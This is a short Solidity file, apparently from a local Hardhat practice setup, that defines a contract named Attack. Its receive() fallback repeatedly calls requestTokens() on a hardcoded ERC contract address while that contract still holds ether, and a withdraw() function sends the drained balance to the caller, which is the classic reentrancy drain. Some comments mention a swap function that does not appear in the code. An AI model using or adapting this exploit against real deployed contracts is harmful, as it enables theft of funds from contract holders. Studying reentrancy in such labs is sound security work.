// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import "./ERC.sol";
import "hardhat/console.sol";

contract Attack {
    function attack(address payable _target) public {
        ERC erc = ERC(_target);
        erc.requestTokens();
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        // console.log("Fallback function called", a);
        // This contract will try to call the swap function of the ERC contract
        // but it will fail because the swap function is not marked as public
        // 获取当前的地址的ether数量，单位是ether
        uint balance = address(payable(0x5FbDB2315678afecb367f032d93F642f64180aa3)).balance;
        uint etherAmount = balance / 1 ether;
        if (etherAmount > 0) {
            ERC erc = ERC(payable(0x5FbDB2315678afecb367f032d93F642f64180aa3));
            erc.requestTokens();
        }
    }
}
